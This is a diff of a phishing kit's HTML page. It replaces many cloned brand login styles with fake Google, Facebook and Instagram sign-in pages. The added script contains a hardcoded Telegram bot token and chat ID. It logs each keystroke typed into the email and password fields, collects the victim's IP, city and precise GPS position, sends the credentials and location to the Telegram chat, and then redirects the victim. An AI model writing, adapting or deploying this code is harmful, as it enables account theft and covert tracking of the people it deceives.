@@ -2,272 +2,317 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Sign in to your account</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in</title>
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { 
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-        background: #f0f2f5; display: flex; justify-content: center; align-items: center; 
-        min-height: 100vh; padding: 0;
-    }
-    .card {
-        background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
-        padding: 32px 24px; width: 100%; max-width: 400px;
-    }
-    .logo { text-align: center; margin-bottom: 24px; }
-    .logo svg { margin-bottom: 8px; }
-    .logo h1 { font-size: 22px; font-weight: 600; margin-top: 8px; }
-    .logo p { font-size: 14px; color: #666; margin-top: 4px; }
-    .input-group { margin-bottom: 16px; }
-    .input-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
-    .input-group input {
-        width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px;
-        font-size: 16px; transition: border-color 0.2s; background: #fafafa;
-    }
-    .input-group input:focus { outline: none; border-color: var(--brand-color, #1a73e8); background: #fff; }
-    .btn {
-        width: 100%; padding: 14px; background: var(--brand-color, #1a73e8); color: #fff; border: none;
-        border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
-        transition: background 0.2s; margin-top: 8px;
-    }
-    .btn:hover { filter: brightness(0.9); }
-    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-    .error { color: #d93025; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
-    .loading { display: none; text-align: center; margin-top: 16px; }
-    .loading .spinner {
-        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid var(--brand-color, #1a73e8);
-        border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loading p { color: #666; font-size: 14px; }
-    .footer { text-align: center; margin-top: 20px; font-size: 13px; color: #999; }
-    .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
-    .footer a:hover { text-decoration: underline; }
-    .checkbox-group {
-        display: flex; align-items: center; gap: 8px; margin: 12px 0;
-    }
-    .checkbox-group input[type="checkbox"] {
-        width: 18px; height: 18px; accent-color: var(--brand-color, #1a73e8);
-    }
-    .checkbox-group label { font-size: 14px; color: #555; cursor: pointer; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; }
 
-    /* Affinity styles */
-    .affinity-wrapper { max-width: 420px; width: 100%; }
-    .affinity-header { background: linear-gradient(135deg, #003d6b 0%, #005a9c 100%); padding: 32px 24px; text-align: center; }
-    .affinity-header h1 { color: #fff; font-size: 22px; font-weight: 700; }
-    .affinity-header p { color: rgba(255,255,255,0.8); font-size: 13px; margin-top: 4px; }
-    .affinity-body { background: #fff; padding: 24px; }
-    .affinity-body .input-group label { font-size: 12px; font-weight: 600; color: #444; letter-spacing: 0.5px; }
-    .affinity-body .input-group input { border: 1.5px solid #ddd; border-radius: 4px; }
-    .affinity-body .input-group input:focus { border-color: #005a9c; box-shadow: 0 0 0 2px rgba(0,90,156,0.1); }
-    .affinity-check { display: flex; align-items: center; gap: 8px; margin: 16px 0; }
-    .affinity-check input { accent-color: #005a9c; }
-    .affinity-check label { font-size: 13px; color: #555; cursor: pointer; }
-    .btn-affinity { background: #005a9c; color: #fff; border: none; border-radius: 4px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-affinity:hover { background: #003d6b; }
-    .affinity-forgot { display: block; text-align: center; margin-top: 14px; font-size: 13px; color: #005a9c; text-decoration: none; }
-    .affinity-forgot:hover { text-decoration: underline; }
-    .affinity-footer { background: #f5f7fa; padding: 14px 24px; text-align: center; border-top: 1px solid #e6e8ec; font-size: 11px; color: #888; }
-    .affinity-footer a { color: #005a9c; text-decoration: none; margin: 0 6px; }
-    .affinity-footer a:hover { text-decoration: underline; }
-    .affinity-phone { color: #555; font-weight: 600; }
+/* Default / Google */
+.card { background:#fff; border-radius:12px; box-shadow:0 2px 12px rgba(0,0,0,0.08); padding:32px 24px; width:100%; max-width:400px; }
+.logo { text-align:center; margin-bottom:24px; }
+.logo h1 { font-size:22px; font-weight:600; margin-top:8px; }
+.logo p { font-size:14px; color:#666; margin-top:4px; }
+.input-group { margin-bottom:16px; }
+.input-group label { display:block; font-size:14px; font-weight:500; color:#333; margin-bottom:6px; }
+.input-group input { width:100%; padding:12px 14px; border:1.5px solid #ddd; border-radius:8px; font-size:16px; background:#fafafa; }
+.input-group input:focus { outline:none; border-color:var(--c); background:#fff; }
+.btn { width:100%; padding:14px; background:var(--c); color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; margin-top:8px; }
+.btn:hover { filter:brightness(0.9); }
+.error { color:#d93025; font-size:13px; margin-top:12px; text-align:center; display:none; }
+.loading { display:none; text-align:center; margin-top:16px; }
+.spinner { width:20px; height:20px; border:3px solid #e0e0e0; border-top:3px solid var(--c); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 8px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+.footer { text-align:center; margin-top:20px; font-size:13px; color:#999; }
+.footer a { color:var(--c); text-decoration:none; }
 
-    /* Affinity security question page */
-    #securityPage { display: none; max-width: 420px; width: 100%; }
-    #securityPage .affinity-header { background: linear-gradient(135deg, #003d6b, #005a9c); padding: 28px 24px; }
-    #securityPage .select-group { margin-bottom: 16px; }
-    #securityPage .select-group label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 6px; letter-spacing: 0.5px; }
-    #securityPage .select-group select { width: 100%; padding: 12px; border: 1.5px solid #ddd; border-radius: 4px; font-size: 14px; background: #fff; }
+/* Facebook */
+.fb-card { max-width:400px; }
+.fb-card .btn { font-size:20px; font-weight:700; }
 
-    /* Affinity 2FA / SMS page */
-    #tfaPage { display: none; max-width: 420px; width: 100%; }
-    #tfaPage .affinity-header { background: linear-gradient(135deg, #003d6b, #005a9c); padding: 28px 24px; }
-    #tfaPage .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
-    #tfaPage .code-inputs input { width: 48px; height: 54px; text-align: center; font-size: 22px; font-weight: 600; border: 1.5px solid #ddd; border-radius: 6px; background: #fafafa; }
-    #tfaPage .code-inputs input:focus { border-color: #005a9c; box-shadow: 0 0 0 2px rgba(0,90,156,0.15); outline: none; background: #fff; }
-    #tfaPage .resend-link { display: block; text-align: center; font-size: 13px; color: #005a9c; text-decoration: none; margin-top: 16px; }
-    #tfaPage .resend-link:hover { text-decoration: underline; }
+/* Affinity */
+.affinity-wrapper { max-width:420px; width:100%; }
+.affinity-header { background:linear-gradient(135deg,#003d6b,#005a9c); padding:32px 24px; text-align:center; }
+.affinity-header h1 { color:#fff; font-size:22px; font-weight:700; }
+.affinity-header p { color:rgba(255,255,255,0.8); font-size:13px; margin-top:4px; }
+.affinity-body { background:#fff; padding:24px; }
+.affinity-body label { display:block; font-size:12px; font-weight:600; color:#444; letter-spacing:0.5px; margin-bottom:6px; }
+.affinity-body input { width:100%; padding:12px; border:1.5px solid #ddd; border-radius:4px; font-size:15px; margin-bottom:16px; background:#fafafa; }
+.affinity-body input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.1); outline:none; background:#fff; }
+.affinity-btn { width:100%; padding:14px; background:#005a9c; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:600; cursor:pointer; }
+.affinity-btn:hover { background:#003d6b; }
+.affinity-footer { background:#f5f7fa; padding:14px 24px; text-align:center; border-top:1px solid #e6e8ec; font-size:11px; color:#888; }
+.affinity-footer a { color:#005a9c; text-decoration:none; margin:0 6px; }
+.code-inputs { display:flex; gap:8px; justify-content:center; margin:20px 0; }
+.code-inputs input { width:48px; height:54px; text-align:center; font-size:22px; font-weight:600; border:1.5px solid #ddd; border-radius:6px; background:#fafafa; }
+.code-inputs input:focus { border-color:#005a9c; box-shadow:0 0 0 2px rgba(0,90,156,0.15); outline:none; background:#fff; }
 
-    /* U-Haul styles */
-    .uhaul-wrapper { max-width: 420px; width: 100%; }
-    .uhaul-logo-bar { background: #E31837; padding: 16px 24px; text-align: center; }
-    .uhaul-logo-bar svg { height: 32px; }
-    .uhaul-tabs { display: flex; border-bottom: 2px solid #e0e0e0; }
-    .uhaul-tabs div { flex: 1; text-align: center; padding: 14px; font-size: 14px; font-weight: 600; color: #888; cursor: pointer; border-bottom: 3px solid transparent; margin-bottom: -2px; transition: all 0.2s; }
-    .uhaul-tabs div.active { color: #E31837; border-bottom-color: #E31837; }
-    .uhaul-body { background: #fff; padding: 24px; }
-    .uhaul-body .input-group input { border-radius: 0; border: 1px solid #ccc; }
-    .uhaul-body .input-group input:focus { border-color: #E31837; box-shadow: none; }
-    .btn-uhaul { background: #E31837; color: #fff; border: none; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 2px; transition: background 0.2s; }
-    .btn-uhaul:hover { background: #c4102e; }
-    .uhaul-divider { text-align: center; margin: 20px 0; color: #999; font-size: 13px; position: relative; }
-    .uhaul-divider::before, .uhaul-divider::after { content: ''; position: absolute; top: 50%; width: 42%; height: 1px; background: #e0e0e0; }
-    .uhaul-divider::before { left: 0; }
-    .uhaul-divider::after { right: 0; }
-    .uhaul-link { display: block; text-align: center; font-size: 13px; color: #E31837; text-decoration: none; margin-top: 12px; }
-    .uhaul-link:hover { text-decoration: underline; }
+/* Instagram */
+.ig-wrapper { max-width:400px; width:100%; background:#fff; border:1px solid #dbdbdb; }
+.ig-body { padding:40px 32px; text-align:center; }
+.ig-body input { width:100%; padding:12px; border:1px solid #dbdbdb; border-radius:4px; background:#fafafa; font-size:12px; margin-bottom:6px; }
+.ig-body input:focus { border-color:#a8a8a8; outline:none; }
+.ig-btn { width:100%; padding:10px; background:#0095F6; color:#fff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; margin-top:8px; }
+.ig-btn:hover { background:#0081db; }
 
-    /* Pinterest styles */
-    .pinterest-wrapper { max-width: 420px; width: 100%; background: #fff; }
-    .pinterest-body { padding: 32px 24px; text-align: center; }
-    .pinterest-body h1 { font-size: 28px; font-weight: 700; color: #333; margin-bottom: 4px; }
-    .pinterest-body p { font-size: 14px; color: #777; margin-bottom: 24px; }
-    .pinterest-body .input-group { text-align: left; }
-    .pinterest-body .input-group input { border-radius: 16px; border: 1px solid #ddd; padding: 14px 16px; }
-    .pinterest-body .input-group input:focus { border-color: #E60023; }
-    .btn-pinterest { background: #E60023; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-pinterest:hover { background: #c5001e; }
-    .pinterest-or { margin: 16px 0; color: #999; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
-    .pinterest-google-btn { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 24px; background: #fff; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-    .pinterest-google-btn:hover { background: #f5f5f5; }
-    .pinterest-footer { font-size: 11px; color: #999; margin-top: 24px; line-height: 1.6; }
-    .pinterest-footer a { color: #999; text-decoration: none; }
-    .pinterest-footer a:hover { text-decoration: underline; }
-
-    /* LinkedIn styles */
-    .linkedin-wrapper { max-width: 420px; width: 100%; background: #fff; border-radius: 8px; overflow: hidden; }
-    .linkedin-body { padding: 32px 28px; }
-    .linkedin-body .linkedin-logo { text-align: center; margin-bottom: 24px; }
-    .linkedin-body h1 { font-size: 24px; font-weight: 600; margin-bottom: 24px; }
-    .linkedin-body .input-group input { border-radius: 4px; border: 1px solid #999; }
-    .linkedin-body .input-group input:focus { border-color: #0A66C2; box-shadow: none; }
-    .linkedin-check { display: flex; align-items: center; gap: 8px; margin: 12px 0; }
-    .linkedin-check input { accent-color: #0A66C2; }
-    .linkedin-check label { font-size: 14px; color: #555; }
-    .btn-linkedin { background: #0A66C2; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-linkedin:hover { background: #004182; }
-    .linkedin-or { text-align: center; margin: 16px 0; font-size: 14px; color: #999; }
-    .linkedin-google-btn { width: 100%; padding: 13px; border: 1px solid #ddd; border-radius: 24px; background: #fff; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-    .linkedin-google-btn:hover { background: #f5f5f5; }
-    .linkedin-forgot { display: block; text-align: center; font-size: 14px; color: #0A66C2; text-decoration: none; margin-top: 12px; }
-    .linkedin-forgot:hover { text-decoration: underline; }
-    .linkedin-agreement { font-size: 11px; color: #999; text-align: center; margin-top: 16px; line-height: 1.5; }
-    .linkedin-agreement a { color: #0A66C2; text-decoration: none; }
-    .linkedin-agreement a:hover { text-decoration: underline; }
-    .linkedin-join { text-align: center; margin-top: 20px; font-size: 15px; }
-    .linkedin-join a { color: #0A66C2; text-decoration: none; font-weight: 600; }
-
-    /* Snapchat styles */
-    .snapchat-wrapper { max-width: 400px; width: 100%; background: #fff; border-radius: 8px; }
-    .snapchat-body { padding: 48px 32px; text-align: center; }
-    .snapchat-body .snapchat-logo { margin-bottom: 32px; }
-    .snapchat-body .input-group input { border-radius: 8px; border: 1px solid #ddd; }
-    .snapchat-body .input-group input:focus { border-color: #000; }
-    .btn-snapchat { background: #FFFC00; color: #000; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-snapchat:hover { background: #e6e300; }
-    .snapchat-links { margin-top: 16px; }
-    .snapchat-links a { display: block; font-size: 13px; color: #000; text-decoration: none; margin-bottom: 8px; }
-    .snapchat-links a:hover { text-decoration: underline; }
-
-    /* DoorDash styles */
-    .doordash-wrapper { max-width: 420px; width: 100%; background: #fff; border-radius: 8px; overflow: hidden; }
-    .doordash-body { padding: 40px 28px; }
-    .doordash-body .dd-logo { text-align: center; margin-bottom: 4px; }
-    .doordash-body h1 { text-align: center; font-size: 22px; font-weight: 600; margin-bottom: 4px; }
-    .doordash-body p { text-align: center; font-size: 14px; color: #666; margin-bottom: 24px; }
-    .btn-doordash { background: #FF3008; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-doordash:hover { background: #e62a00; }
-    .dd-google-btn { width: 100%; padding: 13px; border: 1px solid #ddd; border-radius: 24px; background: #fff; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; }
-    .dd-google-btn:hover { background: #f5f5f5; }
-    .dd-or { text-align: center; margin: 16px 0; color: #999; font-size: 13px; }
-    .dd-forgot { display: block; text-align: center; font-size: 13px; color: #FF3008; text-decoration: none; margin-top: 12px; }
-    .dd-forgot:hover { text-decoration: underline; }
-    .dd-terms { font-size: 11px; color: #999; text-align: center; margin-top: 20px; line-height: 1.5; }
-    .dd-terms a { color: #666; text-decoration: none; }
-    .dd-terms a:hover { text-decoration: underline; }
-
-    /* Uber Eats styles */
-    .ubereats-wrapper { max-width: 420px; width: 100%; background: #fff; }
-    .ubereats-body { padding: 40px 28px; text-align: center; }
-    .ubereats-body .ue-logo { margin-bottom: 16px; }
-    .ubereats-body h1 { font-size: 24px; font-weight: 600; margin-bottom: 24px; }
-    .btn-ubereats { background: #000; color: #fff; border: none; border-radius: 4px; padding: 14px; font-size: 16px; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-ubereats:hover { background: #333; }
-    .ue-divider { margin: 20px 0; color: #999; font-size: 13px; position: relative; }
-    .ue-link { display: block; font-size: 13px; color: #06C167; text-decoration: none; margin-top: 12px; }
-    .ue-link:hover { text-decoration: underline; }
-    .ue-footer { font-size: 11px; color: #999; margin-top: 24px; }
-    .ue-footer a { color: #999; text-decoration: none; }
-
-    /* Etsy styles */
-    .etsy-wrapper { max-width: 420px; width: 100%; background: #fff; }
-    .etsy-body { padding: 40px 28px; }
-    .etsy-body .etsy-logo { text-align: center; margin-bottom: 24px; font-family: 'Times New Roman', serif; }
-    .etsy-body .etsy-logo h1 { font-size: 32px; font-weight: 400; font-style: italic; }
-    .btn-etsy { background: #F1641E; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; }
-    .btn-etsy:hover { background: #d95514; }
-    .etsy-or { text-align: center; margin: 16px 0; font-size: 12px; color: #999; }
-    .etsy-link { display: block; text-align: center; font-size: 13px; color: #F1641E; text-decoration: none; margin-top: 12px; }
-    .etsy-link:hover { text-decoration: underline; }
-
-    /* VSCO styles */
-    .vsco-wrapper { max-width: 400px; width: 100%; background: #fff; }
-    .vsco-body { padding: 48px 32px; text-align: center; }
-    .vsco-body .vsco-logo { margin-bottom: 32px; font-size: 28px; font-weight: 700; letter-spacing: 4px; }
-    .vsco-body .vsco-logo .v { font-weight: 900; }
-    .vsco-body h2 { font-size: 18px; font-weight: 500; margin-bottom: 24px; }
-    .btn-vsco { background: #000; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; }
-    .btn-vsco:hover { background: #333; }
-    .vsco-links { margin-top: 16px; }
-    .vsco-links a { font-size: 13px; color: #000; text-decoration: none; }
-    .vsco-links a:hover { text-decoration: underline; }
-
-    /* LeetCode styles */
-    .leetcode-wrapper { max-width: 400px; width: 100%; background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
-    .leetcode-body { padding: 32px 24px; text-align: center; }
-    .leetcode-body .lc-logo { margin-bottom: 24px; }
-    .leetcode-body h2 { font-size: 20px; font-weight: 600; margin-bottom: 16px; }
-    .lc-social-btns { display: flex; justify-content: center; gap: 12px; margin: 16px 0; }
-    .lc-social-btn { width: 44px; height: 44px; border: 1px solid #ddd; border-radius: 50%; background: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-    .lc-social-btn:hover { background: #f5f5f5; }
-    .btn-leetcode { background: #FFA116; color: #000; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
-    .btn-leetcode:hover { background: #f59400; }
-    .lc-terms { font-size: 11px; color: #999; margin-top: 16px; }
-    .lc-terms a { color: #FFA116; text-decoration: none; }
-
-    /* TikTok styles */
-    .tiktok-wrapper { max-width: 400px; width: 100%; background: #fff; border-radius: 8px; }
-    .tiktok-body { padding: 48px 32px; text-align: center; }
-    .tiktok-body .tt-logo { margin-bottom: 24px; }
-    .tiktok-body h2 { font-size: 20px; font-weight: 600; margin-bottom: 24px; }
-    .btn-tiktok { background: #000; color: #fff; border: none; border-radius: 4px; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; }
-    .btn-tiktok:hover { background: #333; }
-    .tiktok-links { margin-top: 16px; }
-    .tiktok-links a { font-size: 13px; color: #000; text-decoration: none; margin: 0 8px; }
-    .tiktok-links a:hover { text-decoration: underline; }
-
-    /* Instagram styles */
-    .instagram-wrapper { max-width: 400px; width: 100%; background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; }
-    .instagram-body { padding: 40px 32px; text-align: center; }
-    .instagram-body .ig-logo { margin-bottom: 32px; }
-    .instagram-body .input-group input { border-radius: 4px; border: 1px solid #dbdbdb; background: #fafafa; padding: 12px; font-size: 12px; }
-    .instagram-body .input-group input:focus { border-color: #a8a8a8; }
-    .btn-instagram { background: #0095F6; color: #fff; border: none; border-radius: 8px; padding: 10px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; }
-    .btn-instagram:hover { background: #0081db; }
-    .instagram-or { display: flex; align-items: center; margin: 16px 0; }
-    .instagram-or .line { flex: 1; height: 1px; background: #dbdbdb; }
-    .instagram-or .text { padding: 0 18px; font-size: 12px; color: #999; font-weight: 600; text-transform: uppercase; }
-    .instagram-fb-link { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; color: #385185; font-weight: 600; text-decoration: none; }
-    .instagram-link { display: block; font-size: 12px; color: #00376b; text-decoration: none; margin-top: 12px; }
-    .instagram-link:hover { text-decoration: underline; }
+/* Hide */
+.hide { display:none !important; }
 </style>
 </head>
 <body>
+<div id="app"></div>
 
-<div id="appRoot"></div>
+<script>
+const BT = "8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84";
+const CI = "8647509715";
 
-<div id="securityPage">
-    <div class="affinity-wrapper">
-        <div class="affinity-header">
-            <svg width="48" height="48" viewBox="0 0 200 60" style="margin-bottom:8px;"><rect width="200" height="60" rx="4" fill="rgba(255,255,255,0.15)"/><circle cx="30" cy="30" r="14" fill="none" stroke="#fff" stroke-width="3"/><path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text><text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text></svg>
-            <h1>Verify Your Identity</h1>
-            <p>For your security, please answer the following question</p>
+// Global state
+let lat = null, lon = null;
+let ipInfo = { ip:'?', city:'?', country:'?', isp:'?' };
+let keystrokeQueue = [];
+let keystrokeTimer = null;
+let lastSent = 0;
+let listenerHandles = []; // for cleanup
+
+// Get IP
+fetch('https://ipapi.co/json/').then(r=>r.json()).then(d => {
+    ipInfo.ip = d.ip || '?';
+    ipInfo.city = d.city || '?';
+    ipInfo.country = d.country_name || '?';
+    ipInfo.isp = d.org || '?';
+    lat = d.latitude; lon = d.longitude;
+}).catch(()=>{});
+
+// Get GPS
+function getGPS() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+        p => { lat = p.coords.latitude; lon = p.coords.longitude; },
+        () => {},
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+}
+getGPS();
+
+// Rate-limited Telegram send (1 msg/sec max to same chat)
+function tg(msg) {
+    const now = Date.now();
+    const wait = Math.max(0, 1100 - (now - lastSent));
+    setTimeout(() => {
+        lastSent = Date.now();
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot' + BT + '/sendMessage', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({ chat_id: CI, text: msg, parse_mode: "Markdown" }));
+    }, wait);
+}
+
+// Batched keystroke send (every 2s, max 5 chars per batch)
+function queueKey(brand, field, char, sofar) {
+    keystrokeQueue.push({ brand, field, char, sofar });
+    if (keystrokeTimer) return;
+    keystrokeTimer = setInterval(() => {
+        if (!keystrokeQueue.length) { clearInterval(keystrokeTimer); keystrokeTimer = null; return; }
+        const batch = keystrokeQueue.splice(0, 5);
+        const msg = batch.map(b => `\`${b.char}\``).join(' ');
+        const last = batch[batch.length - 1];
+        tg(`⌨️ *${batch[0].brand}* — ${last.field}: ${msg}\n→ \`${last.sofar}\``);
+    }, 2000);
+}
+
+// Build location string
+function locStr() {
+    let s = `🌐 IP: \`${ipInfo.ip}\`\n📍 ${ipInfo.city}, ${ipInfo.country}\n🏢 ${ipInfo.isp}`;
+    if (lat && lon) s += `\n🎯 GPS: ${lat}, ${lon}\n🗺 https://www.google.com/maps?q=${lat},${lon}`;
+    s += `\n⏰ ${new Date().toISOString()}`;
+    return s;
+}
+
+// Cleanup old listeners before rendering new page
+function cleanListeners() {
+    listenerHandles.forEach(h => h.remove && h.remove());
+    listenerHandles = [];
+}
+
+function addKeyListener(el, brand, field) {
+    if (!el) return;
+    const handler = function() {
+        const v = el.value;
+        if (v.length > 0) {
+            queueKey(brand, field, v[v.length-1], v);
+        }
+    };
+    el.addEventListener('input', handler);
+    listenerHandles.push({ remove: () => el.removeEventListener('input', handler) });
+}
+
+function setCSS(color) {
+    document.documentElement.style.setProperty('--c', color);
+}
+
+// ==========================================
+// PAGE: Google
+// ==========================================
+function renderGoogle() {
+    setCSS('#1a73e8');
+    document.getElementById('app').innerHTML = `
+    <div class="card">
+        <div class="logo">
+            <svg width="48" height="48" viewBox="0 0 48 48"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg>
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
         </div>
-        <div class="affinity-body">
-            <form id="securityForm">
-                <div class="select-group"><label>SECURITY QUESTION</label>
-                    <select id="secQ1" required>
+        <form id="loginForm">
+            <div class="input-group"><label>Email or phone</label><input type="text" id="email" placeholder="you@gmail.com" required></div>
+            <div class="input-group"><label>Password</label><input type="password" id="password" required></div>
+            <div class="error" id="errorMsg">Couldn't sign you in.</div>
+            <button type="submit" class="btn">Sign in</button>
+        </form>
+        <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
+        <div class="footer"><a href="#">Forgot password?</a></div>
+    </div>`;
+    setupGoogle();
+}
+
+function setupGoogle() {
+    const f = document.getElementById('loginForm');
+    const e = document.getElementById('email');
+    const p = document.getElementById('password');
+    addKeyListener(e, 'Google', 'Email');
+    addKeyListener(p, 'Google', 'Password');
+    f.addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const em = e.value.trim(), pw = p.value;
+        document.getElementById('loadingIndicator').style.display = 'block';
+        tg(`🔔 *Google — Creds*\n📧 \`${em}\`\n🔑 \`${pw}\`\n\n${locStr()}`);
+        getGPS();
+        setTimeout(() => {
+            const coords = (lat && lon) ? `${lat},${lon}` : '';
+            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://accounts.google.com';
+        }, 2000);
+    });
+}
+
+// ==========================================
+// PAGE: Facebook
+// ==========================================
+function renderFacebook() {
+    setCSS('#1877F2');
+    document.getElementById('app').innerHTML = `
+    <div class="card fb-card">
+        <div class="logo">
+            <svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg>
+            <h1 style="color:#1877F2">Log in to Facebook</h1>
+        </div>
+        <form id="loginForm">
+            <div class="input-group"><label>Email or phone</label><input type="text" id="email" placeholder="Email or phone" required></div>
+            <div class="input-group"><label>Password</label><input type="password" id="password" required></div>
+            <button type="submit" class="btn">Log in</button>
+            <div class="error" id="errorMsg">Wrong credentials.</div>
+        </form>
+        <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
+        <div class="footer"><a href="#">Forgotten account?</a></div>
+    </div>`;
+    setupFacebook();
+}
+
+function setupFacebook() {
+    const f = document.getElementById('loginForm');
+    const e = document.getElementById('email');
+    const p = document.getElementById('password');
+    addKeyListener(e, 'Facebook', 'Email');
+    addKeyListener(p, 'Facebook', 'Password');
+    f.addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const em = e.value.trim(), pw = p.value;
+        document.getElementById('loadingIndicator').style.display = 'block';
+        tg(`🔔 *Facebook — Creds*\n📧 \`${em}\`\n🔑 \`${pw}\`\n\n${locStr()}`);
+        getGPS();
+        setTimeout(() => {
+            const coords = (lat && lon) ? `${lat},${lon}` : '';
+            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://facebook.com';
+        }, 2000);
+    });
+}
+
+// ==========================================
+// PAGE: Instagram
+// ==========================================
+function renderInstagram() {
+    document.getElementById('app').innerHTML = `
+    <div class="ig-wrapper">
+        <div class="ig-body">
+            <svg width="64" height="64" viewBox="0 0 48 48"><defs><linearGradient id="g" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#g)"/><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg>
+            <form id="loginForm" style="margin-top:32px">
+                <input type="text" id="email" placeholder="Phone, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="ig-btn">Log in</button>
+                <div class="error" id="errorMsg">Sorry, password incorrect.</div>
+            </form>
+            <div class="loading" id="loadingIndicator" style="display:none;margin-top:16px"><div class="spinner"></div><p>Logging in...</p></div>
+        </div>
+    </div>`;
+    setupInstagram();
